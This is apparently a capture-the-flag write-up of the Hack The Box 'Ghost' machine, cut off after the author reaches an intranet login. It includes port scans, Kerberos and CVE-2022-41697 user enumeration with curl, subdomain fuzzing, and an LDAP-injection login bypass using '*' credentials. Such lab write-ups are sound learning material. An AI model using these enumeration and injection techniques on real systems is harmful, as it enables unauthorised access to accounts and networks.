# Host file setup
```python
sudo nxc smb 10.129.231.105 --generate-hosts-file /etc/hosts
 
SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.ghost.htb        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:40 +0100
Nmap scan report for dc01.ghost.htb (10.129.231.105)
Host is up (0.013s latency).
rDNS record for 10.129.231.105: DC01.ghost.htb
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49672/tcp open  unknown
49681/tcp open  unknown
63211/tcp open  unknown
63351/tcp open  unknown
64506/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.27 seconds
```

Looks like there is port `2179` open, which means there is likely some virtualization
## Nmap
```python
nmap -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 -A --min-rate=2000 -sT dc01.ghost.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:44 +0100
Nmap scan report for dc01.ghost.htb (10.129.231.105)
Host is up (0.013s latency).
rDNS record for 10.129.231.105: DC01.ghost.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-25 15:44:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-25T15:36:31
|_Not valid after:  2056-08-25T15:36:31
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-08-25T15:45:59+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.231.105:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-25T15:45:59+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2026-08-24T15:33:38
|_Not valid after:  2027-02-23T15:33:38
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-25T15:45:18+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

# SMB (445)
Null auth is enabled but not able to list shares or users with it

The guest account is disabled!

# HTTP (80)

![](Pasted%20image%2020260825165604.png)

Landing page just looks like a 404, however i dont think its a default 404 page

There are no subdomains

Feroxbuster did not find anything

Nuclei did not find anything

# HTTP (443)

This site wont load, over either http or https, theres not a lot i can do with it right now

# HTTP (8008)

![](Pasted%20image%2020260825171258.png)

Looks like a CMS of some sort called Ghost

Potential user `kathryn.holland`?

Opening the post, i can see the author `kathryn.holland` has a page inside `/author/`, its possible i can use this to find valid users

![](Pasted%20image%2020260825171334.png)

Using wappalyzer i can see that this service is being run off an ubuntu machine, this is likely the virtualization i mentioned earlier

```python
nxc smb dc01.ghost.htb -u kathryn.holland -p '' -k
SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.ghost.htb  445    DC01             [-] ghost.htb\kathryn.holland: KDC_ERR_PREAUTH_FAILED
```

Using kerberos i am able to use error output to determine valid users, looks like `kathryn.holland` is a valid domain user, this give me a valid username format
## Nuclei 
```python
nuclei -u http://ghost.htb:8008/ -rl 50 

[CVE-2022-41697] [http] [medium] http://ghost.htb:8008/ghost/api/admin/session
```

Found a CVE

## CVE-2022-41697

> A user enumeration vulnerability exists in the login functionality of Ghost Foundation Ghost 5.9.4. A specially-crafted HTTP request can lead to a disclosure of sensitive information. An attacker can send a series of HTTP requests to trigger this vulnerability.

https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"lkjasdfklasjdf@asdf.com","password":"asdfasdfasdf"}' | jq .
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    291 100    227 100     64   2705    762                              0
{
  "errors": [
    {
      "message": "There is no user with that email address.",
      "context": null,
      "type": "NotFoundError",
      "details": null,
      "property": null,
      "help": null,
      "code": null,
      "id": "8523fb70-a0a2-11f1-a02f-09a7d9773575",
      "ghostErrorCode": null
    }
  ]
}
```

Ill use the example POC in the article and see the error, this indicates this user doesnt exist

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}'
{"errors":[{"message":"Your password is incorrect.","context":"Your password is incorrect.","type":"ValidationError","details":null,"property":null,"help":"Visit and save your profile after logging in to check for problems.","code":"PASSWORD_INCORRECT","id":"71ce7d20-a0a2-11f1-a02f-09a7d9773575","ghostErrorCode":null}]}
```

But if i now test this POC with a user i know exists, i can see i get an error `Your password is incorrect` confirming the POC works

Another thing to note, the API is using domain credentials, since i know the user `kathryn.holland` is a domain user

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}' | jq . 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    394 100    328 100     66   4522    909                              0
{
  "errors": [
    {
      "message": "Too many login attempts. Please wait 3 minutes before trying again, or reset your password.",
      "context": "Too many login attempts.",
      "type": "TooManyRequestsError",
      "details": null,
      "property": null,
      "help": "Too many login attempts.",
      "code": null,
      "id": "898d7aa0-a0a3-11f1-a02f-09a7d9773575",
      "ghostErrorCode": null
    }
  ]
}
```

If i send another request i see, there is a error for too many logon attempts, this prevents me from fuzzing the application to find valid users. But since the application is using domain credentials, kerbrute will work fine to enumerate users

## Ghost logon form

![](Pasted%20image%2020260825174803.png)

When trying the logon, it uses that session endpoint, used above to try and find valid users

The forgot password function, doesnt actually send a request anywhere, eventually the request times out

## Subdomains
```python
ffuf -u http://ghost.htb:8008/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.ghost.htb' -ic -c -t 30 -fs 7676 

intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 239ms]
```

Found an intranet subdomain

# Access to the `intranet` subdomain on port 8008

Using simple ldap injection 

```python
Username: *
Password: *
```

I got access

![](Pasted%20image%2020260825182240.png)

I am logged in as `kathryn.holland`

Also some interesting info on the homescreen

![1203](Pasted%20image%2020260826165723.png)

Some info on more users, thise looks to be domain users too!

![1324](Pasted%20image%2020260826170046.png)



